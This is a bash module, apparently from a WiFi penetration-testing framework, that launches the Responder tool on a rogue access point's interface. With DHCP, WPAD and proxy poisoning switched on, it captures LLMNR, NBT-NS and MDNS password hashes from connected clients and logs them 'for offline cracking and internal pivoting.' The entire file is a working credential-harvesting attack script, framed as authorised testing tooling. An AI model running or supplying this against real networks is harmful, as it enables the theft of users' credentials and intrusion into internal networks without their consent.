#!/usr/bin/env bash
# MODULE_META
# NAME="Responder Pivot & Hash Capture"
# CATEGORY="G"
# DEPS="F1"
# CRITICAL="no"
# TOOLS="responder"
# DESC="Run Responder to capture LLMNR/NBT-NS hashes from connected clients"
# REQS="managed_iface"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/g6_responder_pivot.sh
#  G6: Responder Pivot (Golden Wrapper)
#
#  METHODOLOGY:
#  1. Launch Responder on the active WiFi interface.
#  2. Capture LLMNR, NBT-NS, and MDNS traffic from clients on the Rogue AP.
#  3. Log captured hashes for offline cracking and internal pivoting.
#===============================================================================

set -euo pipefail

# SNR Safeguard (Inherited from core)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="G6"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting Responder pivot on ${C_VAR}${INTERFACE}${C_RESET}..."
"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 20 --status "Launching Responder..."

LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_responder.log"

# Responder creates its own logs in /usr/share/responder/logs or similar
# We'll try to redirect stdout to our session evidence
if command -v responder &>/dev/null; then
    # -I: Interface, -d: DHCP, -w: WPAD, -P: Proxy
    # We run in foreground but the Go orchestrator can spawn us in background
    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
        responder -I "$INTERFACE" -dwP 2>&1 | tee "$LOG_FILE"
    else
        responder -I "$INTERFACE" -dwP > "$LOG_FILE" 2>&1
    fi
else
    echo "[!] responder tool not found."
    exit 1
fi
